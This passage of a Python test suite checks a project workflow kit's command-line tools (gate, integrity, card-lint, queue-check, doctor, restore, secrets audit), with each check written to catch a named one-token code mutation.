    put(d, ".hermes/plans/WORKLOG.md", "\n".join(["## 2026-11-03T10:00:00+02:00 | T-009 | FAIL"] * 3) + "\n")
    rc, out = lrn(d)
    # kills learn.py:88 row 23 (bad[0][1] -> bad[0][2]: IndexError) and :71 row 10 (the cited line)
    check("learn.py: three FAIL runs of one card give third-fail (not unstable-card) citing WORKLOG.md:1 and '3 FAIL/STOP of 3 runs' (an index 2 raises, a start of 2 cites line 2)",
          rc == 0 and "third-fail | T-009: 3 FAIL/STOP of 3 runs, WORKLOG.md:1" in out and "unstable-card" not in out and "Traceback" not in out, out)

    # ================= learn.py: audit ledger =================
    d = fx("d2_led1")
    put(d, ".hermes/plans/AUDIT_LEDGER.md", "| AUD-01 | HIGH | f | e | OPEN | s\n")
    rc, out = lrn(d)
    # kills learn.py:102 row 21 (group(1) -> group(2): the message names HIGH), :99 row 102 (enumerate start: the line moves), :105 rows 101 and 111 (hi[0][2] -> hi[1][2]: IndexError on one finding)
    check("learn.py: ONE open HIGH row -> open-severe names the finding id and its real line, '1 CRIT/HIGH OPEN: AUD-01, AUDIT_LEDGER.md:1', no Traceback (indexing hi[1] raises, a severity in place of the id or a line 2 fails here)",
          rc == 0 and last(out) == "LEARN SUGGEST 1" and "open-severe | 1 CRIT/HIGH OPEN: AUD-01, AUDIT_LEDGER.md:1" in out
          and "ledger-backlog" not in out and "Traceback" not in out, out)

    d = fx("d2_led6")
    put(d, ".hermes/plans/AUDIT_LEDGER.md", "".join("| AUD-%02d | HIGH | f | e | OPEN | s\n" % i for i in range(1, 7)))
    rc, out = lrn(d)
    # kills learn.py:105 row 76 (the id slice hi[:5] -> hi[:6])
    check("learn.py: open-severe lists the first FIVE ids -> 6 CRIT/HIGH OPEN names AUD-01..AUD-05 and AUDIT_LEDGER.md:1, and AUD-06 is never named (a [:6] slice prints it)",
          rc == 0 and "open-severe | 6 CRIT/HIGH OPEN: AUD-01, AUD-02, AUD-03, AUD-04, AUD-05, AUDIT_LEDGER.md:1" in out
          and "AUD-06" not in out, out)

    d = fx("d2_crlf")
    for n in ("a", "b", "c", "d"):
        put(d, ".hermes/plans/" + n + ".md", b"x = 1" + bytes([13, 13, 10]))
    rc, out = lrn(d)
    # kills learn.py:150 row 29 (the name slice _cc[:3] -> _cc[:4])
    check("learn.py: crcrlf names the first THREE files holding CR CR LF -> four such registers report 'a.md, b.md, c.md' and never d.md (a [:4] slice prints it)",
          rc == 0 and "crcrlf | a.md, b.md, c.md hold CR CR LF line endings" in out and "d.md" not in out, out)

    # ================= findings_lint.py =================
    d = work / "d2_find"
    (d / ".hermes/plans").mkdir(parents=True, exist_ok=True)
    put(d, "bad.md", "FINDING B0 | CONFIRMED | a.py:1 | ok | `ls`\n"
                     "FINDING B1 | CONFIRMED | a.py:1 | no command here | looks wrong\n"
                     "FINDING | CONFIRMED | a.py:4 | no id in the first cell | `ls`\n")
    rc, out = sh([py, "-I", "-B", FL, "bad.md"], cwd=d)
    # kills findings_lint.py:19 row 1 (enumerate start 1 -> 2: every reported line number moves)
    check("findings_lint.py: the reported line number is the real one -> 'bad.md:2 CONFIRMED needs a backticked command' and 'bad.md:3 first cell must be ...', FINDINGS-LINT FAIL 2 (a start of 2 reports lines 3 and 4)",
          rc == 1 and "bad.md:2 CONFIRMED needs a backticked command as evidence" in out
          and "bad.md:3 first cell must be 'FINDING <id>', got 'FINDING'" in out and "FINDINGS-LINT FAIL 2" in out, out)

    # ================= review_pack.py =================
    if shutil.which("git"):
        d = work / "d2_rp"
        (d / ".hermes/plans").mkdir(parents=True, exist_ok=True)
        sh(["git", "init", "-q"], cwd=d)
        sh(["git", "config", "user.name", "Test"], cwd=d)
        sh(["git", "config", "user.email", "t@e.invalid"], cwd=d)
        put(d, "a.txt", "one\n")
        sh(["git", "add", "-A"], cwd=d)
        sh(["git", "commit", "-q", "-m", "c1"], cwd=d)
        put(d, "a.txt", "one\ntwo\n")
        sh(["git", "add", "-A"], cwd=d)
        sh(["git", "commit", "-q", "-m", "c2"], cwd=d)
        rc, out = sh([py, "-I", "-B", RP, "HEAD~1"], cwd=d)
        pack = d / ".hermes/plans/gate_output/review_pack.diff"
        txt = pack.read_text(encoding="utf-8") if pack.is_file() else ""
        # kills review_pack.py:19 row 15 (len(sys.argv) < 2 -> < 3: one ref is treated as 'no argument' and the tag lookup fails)
        check("review_pack.py: ONE argument is a fixed point, not 'no argument' -> the default pack is written with # commits, # stat and # diff holding the second commit, exit 0 (a < 3 test falls into the tag lookup, finds no tag and exits on the usage line)",
              rc == 0 and "REVIEW-PACK OK" in out and "# commits" in txt and "# stat" in txt and "+two" in txt and "Traceback" not in out, (out, txt[-200:]))
    else:
        skip("review_pack.py: one argument is a fixed point, not 'no argument'", "no git on PATH")

    # ================= worker_report.py =================
    W = new_project(work, "d2_wr")
    rc, out = sh([py, "-I", "-B", "tools/worker_report.py", "--ask", "Which", "timeout?"], cwd=W)
    qp = W / ".hermes/plans/QUESTIONS.md"
    q = qp.read_text(encoding="utf-8") if qp.is_file() else ""
    # kills worker_report.py:6 row 0 (a != --ask -> a == --ask: the text is dropped and aw.py ask exits 2); row 2 (argv[1:] -> [2:]) is equivalent while argv[1] is --ask
    check("worker_report.py: every argument after --ask reaches aw.py ask, word by word -> ASKED Q-001 and the recorded question is '> Which timeout?' (keeping only --ask drops the text and aw.py ask exits on its usage line)",
          rc == 0 and "ASKED Q-001" in out and "> Which timeout?" in q, (out, q[-200:]))


def section_gaps4(work: Path):
    """Engine behaviour that survived a one-token mutation after 2.8.3 (third series): each check fails on a named mutant."""
    print("\n-- gaps, third series: engine commands")
    G = new_project(work, "gaps4")
    plans = G / ".hermes/plans"

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    def envline(txt, key, val):
        """The whole KEY= line replaced: the old one dropped, the new one last (kit.env is line based)."""
        return "\n".join([ln for ln in txt.split("\n") if not ln.startswith(key + "=")] + [key + "=" + val])

    # ---- C3-01 the gate honours FAIL_REGEX (kills S29, aw.py:197)
    put(G, "tests/boom.py", 'print("Ran 5 tests")\nprint("BOOM")\n')
    env0 = (G / "tools/kit.env").read_text(encoding="utf-8")
    put(G, "tools/kit.env", envline(envline(env0, "TEST_CMD", f"{sys.executable} -I -B tests/boom.py"), "FAIL_REGEX", "BOOM"))
    rc1, o1 = aw(G, "gate", "boom")
    put(G, "tests/boom.py", 'print("Ran 5 tests")\n')
    rc2, o2 = aw(G, "gate", "calm")
    put(G, "tools/kit.env", env0)
    check("gate honours FAIL_REGEX: a suite that exits 0 but prints BOOM -> rc=1, 'GATE FAIL' with reason failure-pattern; the same suite without BOOM -> GATE OK count=5",
          rc1 == 1 and "GATE FAIL" in o1 and "failure-pattern" in o1 and rc2 == 0 and "GATE OK count=5" in o2, (rc1, o1, rc2, o2))

    # ---- C3-02 three usage refusals keep exit 2 (kills S106, S119, S22, S25, aw.py:209/495/607)
    ra, oa = aw(G, "gate", "a", "b")
    rb, ob = aw(G, "restore")
    rc, oc = aw(G, "answer", "Q-001")
    check("RED: three usage refusals: 'gate a b' -> 2 with 'usage: aw.py gate' and no gate_output/a.txt; 'restore' with no id -> 2 with 'usage: aw.py restore'; 'answer Q-001' with no text -> 2 with 'usage: aw.py answer'",
          ra == 2 and "usage: aw.py gate" in oa and not (plans / "gate_output/a.txt").exists()
          and rb == 2 and "usage: aw.py restore" in ob
          and rc == 2 and "usage: aw.py answer" in oc, (ra, oa, rb, ob, rc, oc))

    # ---- C3-03 RED: COUNT_REGEX without a capture group is a named refusal (kills S64, aw.py:73)
    put(G, "tools/kit.env", envline(env0, "COUNT_REGEX", chr(92) + "d+ passed"))
    rc, out = aw(G, "gate", "nogroup")
    put(G, "tools/kit.env", env0)
    check("RED: COUNT_REGEX without a capture group -> exit 2, 'COUNT_REGEX needs one capture group', no Traceback",
          rc == 2 and "COUNT_REGEX needs one capture group" in out and "Traceback" not in out, (rc, out))

    # ---- C3-04 integrity: the recorded floor, the baseline version, a missing floor (kills S37, S85, S109, S96, S16; aw.py:276-311)
    I = new_project(work, "gaps4int")

    def rat(n):
        d = json.loads((I / ".aw/ratchet.json").read_text(encoding="utf-8")); d["min_tests"] = n
        put(I, ".aw/ratchet.json", json.dumps(d))

    def base(**kw):
        d = json.loads((I / ".aw/baseline.json").read_text(encoding="utf-8")); d.update(kw)
        put(I, ".aw/baseline.json", json.dumps(d))

    def rebase():
        rat(3); aw(I, "integrity", "--write-baseline", "--i-am-architect")

    aw(I, "ratchet", "--raise", "3", "--i-am-architect")
    aw(I, "integrity", "--write-baseline", "--i-am-architect")  # baseline version 2, floor 3
    rat(1); ra, oa = aw(I, "integrity")
    rb, ob = aw(I, "integrity", "--write-baseline", "--i-am-architect")
    rebase()
    rat(1); base(version=1, floor=99)
    rc, oc = aw(I, "integrity", "--write-baseline", "--i-am-architect")
    rebase()
    rat(3)
    d = json.loads((I / ".aw/baseline.json").read_text(encoding="utf-8")); d.pop("version", None); d["floor"] = 99
    put(I, ".aw/baseline.json", json.dumps(d))
    rc3, o3 = aw(I, "integrity")
    rebase()
    rat(0)
    d = json.loads((I / ".aw/baseline.json").read_text(encoding="utf-8")); d.pop("floor", None); d["version"] = 2
    put(I, ".aw/baseline.json", json.dumps(d))
    rc4, o4 = aw(I, "integrity")
    rebase()
    check("integrity: a v2 baseline keeps its recorded floor 3 when the ratchet drops to 1 (RATCHET-LOWERED); the rewrite warns 'min_tests=1 < recorded floor 3' and keeps floor=3; a v1 baseline ignores floor 99 (floor=1, no WARN); a baseline with no 'version' is legacy (no RATCHET-LOWERED, no FROZEN-CHANGED); a v2 baseline without 'floor' tolerates ratchet 0",
          ra == 1 and "RATCHET-LOWERED" in oa
          and rb == 0 and "WARN ratchet.json min_tests=1 < recorded floor 3" in ob and "floor=3" in ob
          and rc == 0 and "floor=1" in oc and "WARN ratchet" not in oc
          and rc3 == 0 and "RATCHET-LOWERED" not in o3 and "FROZEN-CHANGED" not in o3
          and rc4 == 0 and "RATCHET-LOWERED" not in o4,
          (ra, oa, rb, ob, rc, oc, rc3, o3, rc4, o4))

    # ---- C3-05 integrity prints six failures and a dots mark for more (kills S54, aw.py:307)
    N = new_project(work, "gaps4int2")

    def zfile(n):
        put(N, ".aw/checks.d/zeros.py", "".join(f'print("ZERO z{i}", 1)\n' for i in range(1, n + 1)))

    zfile(7)
    aw(N, "integrity", "--write-baseline", "--i-am-architect")
    r7, o7 = aw(N, "integrity")
    zfile(6)
    aw(N, "integrity", "--write-baseline", "--i-am-architect")
    r6, o6 = aw(N, "integrity")
    f7 = next((ln for ln in o7.splitlines() if ln.startswith("INTEGRITY FAIL")), "")
    f6 = next((ln for ln in o6.splitlines() if ln.startswith("INTEGRITY FAIL")), "")
    check("integrity: 7 failures -> the first line says 'INTEGRITY FAIL 7:', shows six (ZERO zeros.z6=1) and ends with ' ...', the indented lines still name z7; 6 failures -> 'INTEGRITY FAIL 6:' and no ' ...'",
          r7 == 1 and "INTEGRITY FAIL 7:" in f7 and "ZERO zeros.z6=1" in f7 and "z7" not in f7
          and f7.endswith(" ...") and "ZERO zeros.z7=1" in o7
          and r6 == 1 and "INTEGRITY FAIL 6:" in f6 and " ..." not in f6, (f7, f6, o7[-200:]))

    # ---- C3-06 queue-check prints six errors and a dots mark for more (kills S19, aw.py:1058)
    Q = new_project(work, "gaps4q")

    def qfile(n):
        ids = " ".join(f"T-9{i:02d}:+0" for i in range(1, n + 1))
        put(Q, ".hermes/plans/cards/QUEUE_probe.md", "# QUEUE\nChain: base=3 | " + ids + " | final=3\n")

    qfile(7)
    q7, qo7 = aw(Q, "queue-check", ".hermes/plans/cards/QUEUE_probe.md")
    qfile(6)
    q6, qo6 = aw(Q, "queue-check", ".hermes/plans/cards/QUEUE_probe.md")
    l7 = next((ln for ln in qo7.splitlines() if ln.startswith("QUEUE-CHECK FAIL")), "")
    l6 = next((ln for ln in qo6.splitlines() if ln.startswith("QUEUE-CHECK FAIL")), "")
    check("queue-check: 7 errors -> 'QUEUE-CHECK FAIL 7:' ends with ' ...' and holds exactly six '; '-separated items; 6 errors -> 'QUEUE-CHECK FAIL 6:' and no ' ...'",
          q7 == 1 and "QUEUE-CHECK FAIL 7:" in l7 and l7.count("; ") == 5 and l7.endswith(" ...")
          and q6 == 1 and "QUEUE-CHECK FAIL 6:" in l6 and " ..." not in l6, (l7, l6))

    # ---- C3-07 doctor: ledger-s8 keeps 40 characters, the CRLF list keeps 5 names (kills S26, S56, S33; aw.py:402, 1175-1200)
    D = new_project(work, "gaps4doc")
    led = D / ".hermes/plans/AUDIT_LEDGER.md"
    b0 = led.read_bytes()
    _, od0 = aw(D, "doctor")
    put(D, ".hermes/plans/AUDIT_LEDGER.md", b0 + b"\n## 9. " + b"X" * 60 + b"\n")
    _, od1 = aw(D, "doctor")
    led.write_bytes(b0)
    l0 = next((ln for ln in od0.splitlines() if "ledger-s8" in ln), "")
    l1 = next((ln for ln in od1.splitlines() if "ledger-s8" in ln), "")
    names = [".aw/c1.txt", ".aw/c2.txt", ".aw/c3.txt", ".aw/c4.txt", ".aw/c5.txt", ".aw/c6.txt"]
    for rel in names[:3]:
        put(D, rel, b"a\r\nb\r\n")
    _, od2 = aw(D, "doctor")
    for rel in names[3:]:
        put(D, rel, b"a\r\nb\r\n")
    _, od3 = aw(D, "doctor")
    for rel in names:
        (D / rel).unlink()
    e3 = next((ln for ln in od2.splitlines() if "line-endings" in ln), "")
    e6 = next((ln for ln in od3.splitlines() if "line-endings" in ln), "")
    check("doctor: ledger-s8 is OK on the pristine ledger and WARN after a '## 9.' heading, whose repr keeps 40 characters (34 X, no 35th); the CRLF list over the files it scans says '3 file(s) with CRLF' with no ' +', then '6 file(s) with CRLF' with five names and ' +1'",
          l0.startswith("DOCTOR OK ledger-s8:")
          and l1.startswith("DOCTOR WARN ledger-s8:") and "'## 9. " + "X" * 34 in l1 and l1.count("X") == 34
          and "3 file(s) with CRLF" in e3 and " +" not in e3
          and "6 file(s) with CRLF" in e6 and " +1" in e6 and sum(1 for x in names if x in e6) == 5,
          (l0, l1, e3, e6))

    # ---- C3-08 restore tells an unchanged file from a rewritten one (kills S40, aw.py:514)
    put(G, "keep/a.py", "v1\n")
    aw(G, "start", "T-081")
    aw(G, "backup", "T-081", "keep/a.py")
    ra, oa = aw(G, "restore", "T-081")
    put(G, "keep/a.py", "v2\n")
    rb, ob = aw(G, "restore", "T-081")
    check("restore: an identical file prints no 'RESTORE --write' (only 'RESTORED 1 file(s)'); a rewritten file prints 'RESTORE --write keep/a.py' and gets v1 back",
          ra == 0 and "RESTORE --write" not in oa and "RESTORED 1 file(s)" in oa
          and rb == 0 and "RESTORE --write keep/a.py" in ob and (G / "keep/a.py").read_bytes() == b"v1\n", (ra, oa, rb, ob))

    # ---- C3-09 audit: a marker of another task, a legacy plain-text marker (kills S91, S76; aw.py:362, 434)
    U = new_project(work, "gaps4aud")
    aw(U, "ratchet", "--raise", "3", "--i-am-architect")
    put(U, ".hermes/plans/cards/T-050.md", LINT_CARD_ROTE)
    aw(U, "integrity", "--write-baseline", "--i-am-architect")
    aw(U, "start", "T-051")
    ra, oa = aw(U, "audit", "T-050", env={"OWNS": "src/a.py"})
    put(U, ".aw/task-start", "T-052 extra words\n")
    rb, ob = aw(U, "audit", "T-050", env={"OWNS": "src/a.py"})
    check("audit: a marker taken for T-051 -> \"task-start is 'T-051'\" and 'OWNS UNMEASURED (task-start mismatch)'; a plain-text marker is legacy -> \"task-start is 'T-052'\" (its first word), not 'extra'",
          ra == 1 and "task-start is 'T-051'" in oa and "OWNS UNMEASURED (task-start mismatch)" in oa
          and "task-start is 'T-052'" in ob, (ra, oa, rb, ob))

    # ---- C3-10 secrets scan: a bare name in .gitignore hides a nested secret-type file (kills S93, aw.py:338)
    S = new_project(work, "gaps4sec")
    put(S, "sub/.env", "x\n")
    put(S, ".gitignore", ".env\n")
    ra, oa = aw(S, "audit")
    put(S, ".gitignore", "")
    rb, ob = aw(S, "audit")
    put(S, ".gitignore", "sub/.env\n")
    rc, oc = aw(S, "audit")
    check("secrets scan: '.env' in .gitignore -> 'WARN FILE sub/.env (secret-type name, git-ignored' and no 'NOT in .gitignore'; an empty .gitignore -> 'FILE sub/.env (secret-type name, NOT in .gitignore)'; the relative path 'sub/.env' -> the WARN again",
          "WARN FILE sub/.env (secret-type name, git-ignored" in oa and "FILE sub/.env (secret-type name, NOT in .gitignore)" not in oa
          and "FILE sub/.env (secret-type name, NOT in .gitignore)" in ob
          and "WARN FILE sub/.env (secret-type name, git-ignored" in oc and "FILE sub/.env (secret-type name, NOT in .gitignore)" not in oc,
          (ra, oa, rb, ob, rc, oc))


def section_gaps5(work: Path):
    """Card-lint, queue-check and modules behaviour that survived a one-token mutation after 2.8.3 (third series)."""
    print("\n-- gaps, third series: card-lint, queue-check, modules")
    G = new_project(work, "gaps5")
    plans = G / ".hermes/plans"

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    aw(G, "ratchet", "--raise", "3", "--i-am-architect")
    R = LINT_CARD_ROTE.replace("T-050", "T-099")
    ROW2 = '| 2 | `python3 -c "print(1)" | tail -1` | `1` |'
    BLK = "```bash\ncat > src/a.py <<'EOF'\nx = 1\nEOF\n```\n"
    DRY = "## DRY-RUN PROOF\n```bash\n$ bash tools/gate.sh pre-T-099\nGATE OK count=3 min=3\n$ python3 -I -B tools/aw.py integrity\nINTEGRITY OK frozen=0 metrics=0 (core=32)\n```\n"

    def lint(text, cid="T-099"):
        put(G, ".hermes/plans/cards/" + cid + ".md", text)
        return aw(G, "card-lint", cid)

    def has(out, rule, *toks):
        return any(rule in ln and all(t in ln for t in toks) for ln in out.splitlines())

    def rules(out):
        tab = {}
        for ln in out.splitlines():
            if ln.startswith("LINT "):
                p = ln.split()
                tab.setdefault(p[2], []).append(int(p[4].rstrip(":")))
        return tab

    def line_of(text, needle):
        for n, ln in enumerate(text.split("\n"), 1):
            if ln == needle:
                return n
        return 0

    # ---- C4-01: `cp` and `mv` in a step are write targets (kills S3)
    cp = R.replace(ROW2, "| 2 | `cp tmp/x.txt src/b.py` | `file exists` |")
    mv = R.replace(ROW2, "| 2 | `mv a.txt src/c.py` | `file exists` |")
    r1, o1 = lint(cp)
    r2, o2 = lint(cp.replace("- src/a.py\n", "- src/a.py\n- src/b.py\n"))
    r3, o3 = lint(mv)
    r4, o4 = lint(mv.replace("- src/a.py\n", "- src/a.py\n- src/c.py\n"))
    check("card-lint L10: `cp tmp/x.txt src/b.py` and `mv a.txt src/c.py` in a STEPS row are write targets -> L10 names src/b.py / src/c.py outside OWNS; the same rows with the target added to OWNS give no L10",
          r1 == 1 and has(o1, "L10", "src/b.py")
          and r2 == 1 and not has(o2, "L10")
          and r3 == 1 and has(o3, "L10", "src/c.py")
          and r4 == 1 and not has(o4, "L10") and "Traceback" not in o1 + o2 + o3 + o4,
          (o1, o2, o3, o4))

    # ---- C4-02: a missing section is reported at line 1, an empty one at its own heading (kills S65, S117, S53, S35)
    rt, ot = lint("# T-099 - probe\n")
    tabt = rules(ot)
    empty = R.replace("## OWNS\n- src/a.py\n", "## OWNS\n\n").replace("CHAIN: ran=3 +0 -> ran=3 (MEASURED)\n", "")
    re_, oe = lint(empty)
    tabe = rules(oe)
    own_line, gate_line = line_of(empty, "## OWNS"), line_of(empty, "## GATE")
    check("card-lint: a card holding only its title reports L07/L14/L15/L35 (and any L40) at line 1; an empty `## OWNS` and an empty `## GATE` are reported at their own heading line, the first element of `SEC.get(...)`, not at the section end",
          all(x == 1 for k in ("L07", "L14", "L15", "L35", "L40") for x in tabt.get(k, [1]))
          and set(("L07", "L14", "L15", "L35")) <= set(tabt)
          and tabe.get("L07") == [own_line] and tabe.get("L14") == [gate_line] and "Traceback" not in ot + oe,
          (tabt, tabe, own_line, gate_line))

    # ---- C4-03: a placeholder inside DRY-RUN PROOF is allowed, one after it is not (kills S4)
    inside = R.replace(DRY, "## DRY-RUN PROOF\nTODO was printed by the tool and is kept verbatim\n```text\nGATE OK count=3 min=3\n```\n")
    after = R + "## NOTES\nTODO moved out of the proof\n"
    stale = R.replace(DRY, "## DRY-RUN PROOF\nmin=9 pasted from an older gate\n```bash\n$ bash tools/gate.sh pre-T-099\nGATE OK count=3 min=3\n$ python3 -I -B tools/aw.py integrity\nINTEGRITY OK frozen=0 metrics=0 (core=32)\n```\n")
    ri, oi = lint(inside)
    ra, oa = lint(after)
    rst, ost = lint(stale)
    todo_line = line_of(after, "TODO moved out of the proof")
    check("card-lint L06: `TODO` inside DRY-RUN PROOF is not a placeholder error; the same line one section further down is L06 at its own line; a stale `min=9` inside that section is skipped by the same guard (line 912), so it is no L16",
          ri == 0 and "CARD-LINT OK errors=0" in oi and not has(oi, "L06")
          and ra == 1 and rules(oa).get("L06") == [todo_line] and has(oa, "L06", "TODO")
          and rst == 0 and not has(ost, "L16")
          and "Traceback" not in oi + oa + ost, (oi, oa, ost, todo_line))

    # ---- C4-04: a RED PROOF section with only blank lines is empty (kills S14)
    blank = R.replace("n/a - characterization: the check must pass on the first run", "\n\n")
    real = R.replace("n/a - characterization: the check must pass on the first run", "\n\nFAIL x")
    rp_line = line_of(R, "## RED PROOF")
    rb, ob = lint(blank)
    rr, orr = lint(real)
    check("card-lint L35: a RED PROOF of two blank lines is empty (line = the RED PROOF heading); with `FAIL x` below them the empty message is gone and the ROTE wording rule reports instead",
          rb == 1 and rules(ob).get("L35") == [rp_line] and has(ob, "L35", "empty")
          and rr == 1 and not has(orr, "L35", "empty") and has(orr, "L35", "ROTE")
          and "Traceback" not in ob + orr, (ob, orr, rp_line))

    # ---- C4-05: four OWNS shapes are refused, a plain path is not (kills S89)
    shapes = (("src" + chr(92) + "a.py", "backslash"), ("src/../a.py", "dotdot"), ("C:/a.py", "drive"), ("/etc/a.py", "absolute"))
    seen, bad = [], []
    for shape, label in shapes:
        rshape, oshape = lint(R.replace("- src/a.py\n", "- " + shape + "\n"))
        seen.append((label, rshape, [x for x in oshape.splitlines() if "L07" in x]))
        if not (rshape == 1 and rules(oshape).get("L07") == [1] and has(oshape, "L07", "project-relative") and "Traceback" not in oshape):
            bad.append(label)
    rplain, oplain = lint(R)
    check("card-lint L07: OWNS `src`+backslash+`a.py`, `src/../a.py`, `C:/a.py` and `/etc/a.py` are each refused at line 1 with the project-relative message; `src/a.py` is not",
          not bad and rplain == 0 and not has(oplain, "L07", "project-relative") and "Traceback" not in oplain,
          (seen, bad, rplain, oplain))

    # ---- C4-06: a malformed Status line is reported at that line (kills S71)
    bad_status = R.replace("Status: READY | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none", "Status: READY | Lane: ROTE | Depends: -")
    rs, ostatus = lint(bad_status)
    status_line = line_of(bad_status, "Status: READY | Lane: ROTE | Depends: -")
    check("card-lint L03: a Status line missing `Module:` and `Author decisions needed:` -> L03 at the line that holds it",
          rs == 1 and rules(ostatus).get("L03") == [status_line] and has(ostatus, "L03", "malformed")
          and "Traceback" not in ostatus, (ostatus, status_line))

    # ---- C4-07: _overlap with an empty tail, and with two incompatible tails (kills S82)
    Q = new_project(work, "gaps5q")
    aw(Q, "gate", "baseline")
    aw(Q, "ratchet", "--raise", "3", "--i-am-architect")
    aw(Q, "integrity", "--write-baseline", "--i-am-architect")
    for cid, owns in (("T-061", "src/k*"), ("T-062", "src/kb*"), ("T-063", "src/k*.py"), ("T-064", "src/kb*.txt"), ("T-065", "lib/k*")):
        put(Q, ".hermes/plans/cards/" + cid + ".md", LINT_CARD_ROTE.replace("T-050", cid).replace("src/a.py", owns))

    def queue(name, a, b):
        put(Q, ".hermes/plans/cards/" + name + ".md", "# QUEUE\nChain: base=3 | " + a + ":+0 " + b + ":+0 | final=3\nQUEUE DONE 0 PASS / 0 FAIL / 0 STOP\n")
        return aw(Q, "queue-check", ".hermes/plans/cards/" + name + ".md")
    q1, oq1 = queue("QUEUE_g5a", "T-061", "T-062")
    q2, oq2 = queue("QUEUE_g5b", "T-065", "T-061")
    q3, oq3 = queue("QUEUE_g5c", "T-063", "T-064")
    check("queue-check: `src/k*` and `src/kb*` (empty tails) overlap -> FAIL naming T-062; `src/k*` and `lib/k*` do not; `src/k*.py` and `src/kb*.txt` do not (two non-empty tails that end differently)",
          q1 == 1 and has(oq1, "overlap", "T-062") and has(oq1, "T-061")
          and q2 == 0 and "QUEUE-CHECK OK" in oq2 and q3 == 0 and "QUEUE-CHECK OK" in oq3
          and "Traceback" not in oq1 + oq2 + oq3, (oq1, oq2, oq3))

    # ---- C4-08: a number in prose is allowed only in the proof text (kills S70)
    num = R.replace(ROW2, '| 2 | `python3 -c "print(1)" | tail -1` | `12345 items` |')
    proved = num.replace("GATE OK count=3 min=3\n", "GATE OK count=3 min=3\nseen count=12345\n")
    rn, on = lint(num)
    rn2, on2 = lint(proved)
    check("card-lint L18: `12345` in a STEPS Expected is reported (not in {chain,floor} nor the proof); the same card with `12345` inside DRY-RUN PROOF is silent",
          rn == 1 and has(on, "L18", "12345") and rn2 == 0 and not has(on2, "L18")
          and "Traceback" not in on + on2, (on, on2))

    # ---- C4-09: a module row without a wave is wave 0, an empty OWNS cell is no owner (kills S27)
    MOD = new_project(work, "gaps5mod")
    head = "# MODULES\n| ID | Module | Purpose | OWNS | Depends | Wave | Gate | Decides | Status |\n|---|---|---|---|---|---|---|---|---|\n"
    put(MOD, ".hermes/plans/MODULES.md", head + "| M-01 | core | the core | src/*.py | - | - | gate | architect | TODO |\n"
        "| M-02 | api | the api | lib/*.py | M-01 | W-1 | gate | architect | TODO |\n")
    rm1, om1 = aw(MOD, "modules")
    put(MOD, ".hermes/plans/MODULES.md", head + "| M-01 | core | the core |  | - | W-1 | gate | architect | TODO |\n")
    rm2, om2 = aw(MOD, "modules")
    check("modules: a row with no wave is the only error and the wave counts as 0, so a W-1 module may depend on it (no same/later-wave error); a row with an empty OWNS cell -> MODULES OK modules=1 waves=1 and no Traceback",
          rm1 == 1 and "MODULES FAIL 1" in om1 and has(om1, "M-01", "Wave") and not has(om1, "same/later")
          and rm2 == 0 and "MODULES OK modules=1 waves=1" in om2 and "Traceback" not in om1 + om2, (om1, om2))

    # ---- C4-10: bash -n errors carry the shell's own words (kills S38)
    badsh = R.replace(BLK, "```bash\ncat > src/a.py <<'EOF'\nx = 1\nEOF\necho \"unterminated\n```\n")
    rsh, osh = lint(badsh)
    rok, ook = lint(R)
    check("card-lint L23: a ```bash block with an unterminated double quote -> one L23 line carrying `bash -n:` and the shell's `unexpected EOF` (the first run is captured, so the shell text appears once, not twice); the valid block gives no such line",
          rsh == 1 and has(osh, "L23", "bash -n:") and "unexpected EOF" in osh and osh.count("unexpected EOF") == 1
          and rok == 0 and "bash -n:" not in ook and "Traceback" not in osh + ook, (osh, ook))

    # ---- C4-11: ~~~ fences are blocks, an unclosed fence ends at EOF, a heredoc needs its terminator (kills S77)
    tilde = R.replace(BLK, "~~~bash\ncp tmp/x.txt src/b.py\n~~~\n")
    unclosed = R.replace(BLK, "```bash\ncat > src/a.py <<'EOF'\nx = 1\nEOF\n")
    noend = R.replace(BLK, "```bash\ncat > src/a.py <<'EOF'\nx = 1\n```\n")
    rti, oti = lint(tilde)
    run, oun = lint(unclosed)
    rne, one = lint(noend)
    check("card-lint fences: a `~~~bash` block closed by `~~~` is a command section (its `cp` line is a write target outside OWNS); a ``` fence never closed runs to the last line with no Traceback; a heredoc without its `EOF` line -> L23 `heredoc EOF has no closing line`, with it -> silent",
          rti == 1 and has(oti, "L10", "src/b.py")
          and "Traceback" not in oun and "missing H2" in oun
          and rne == 1 and has(one, "L23", "heredoc") and "Traceback" not in oti + oun + one, (oti, oun, one))


def section_gaps_mod3(work: Path):
    """Behaviour that a one-token change of learn.py, init_project.py, setup_project.py or worker_report.py could alter
    with the suite still green, third series. Replays the survivors of wk/D3_learn.jsonl, wk/D3_init.jsonl,
    wk/D3_setup.jsonl and wk/D3_report.jsonl; every check names the rows it kills."""
    print("\n-- gaps, third series: module tools")
    py = sys.executable
    LRN = str(KIT / "payload/tools/learn.py")
    INIT = str(KIT / "init_project.py")
    SETUP = str(KIT / "setup_project.py")

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    def ini(*a):
        return sh([py, "-B", INIT, *a], cwd=work)

    # ================= learn.py: empty-pass, the CHK/AUD exemption =================
    d = work / "d3_empty_pass"
    put(d, ".hermes/plans/WORKLOG.md",
        "## 2026-11-09T10:00:00+02:00 | T-801 | PASS\n- Files: none\n"
        "## 2026-11-09T10:01:00+02:00 | CHK-801 | PASS\n- Files: none\n"
        "## 2026-11-09T10:02:00+02:00 | AUD-801 | PASS\n- Files: none\n")
    rc, out = sh([py, "-I", "-B", LRN, str(d)], cwd=work)
    # kills learn.py:73 row 64 (cur[0] -> cur[1]: the exemption reads the status, so CHK and AUD lose it)
    check("learn.py: a PASS whose `- Files:` line lists no file is an empty-pass for T-801 and never for a CHK or an AUD card -> 'empty-pass | T-801 PASS lists no changed file, WORKLOG.md:2', LEARN SUGGEST 1 and neither id named (a cur[1] exempts nobody)",
          rc == 0 and (out.strip().splitlines() or [""])[-1] == "LEARN SUGGEST 1"
          and "empty-pass | T-801 PASS lists no changed file, WORKLOG.md:2" in out
          and "CHK-801" not in out and "AUD-801" not in out and "Traceback" not in out, out)

    # ================= init_project.py: a GUIDE.md when .hermes/plans is already there =================
    G1 = work / "d3_guide_plain"
    put(G1, ".hermes/plans/NOTES.md", "one file the owner already has\n")
